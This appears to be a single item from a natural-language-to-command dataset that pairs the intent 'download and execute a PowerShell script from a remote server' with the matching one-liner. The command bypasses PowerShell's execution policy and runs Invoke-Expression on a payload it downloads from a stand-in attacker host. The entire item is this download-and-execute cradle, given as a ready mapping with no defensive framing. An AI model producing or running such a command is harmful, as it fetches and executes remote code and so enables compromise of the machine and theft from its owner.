# Natural language intent:
# Download and execute a PowerShell script from a remote server.

powershell.exe -exec bypass -Command "Invoke-Expression -Command (New-Object System.Net.WebClient).DownloadString('http://evil-axample.com/heavypayload')"
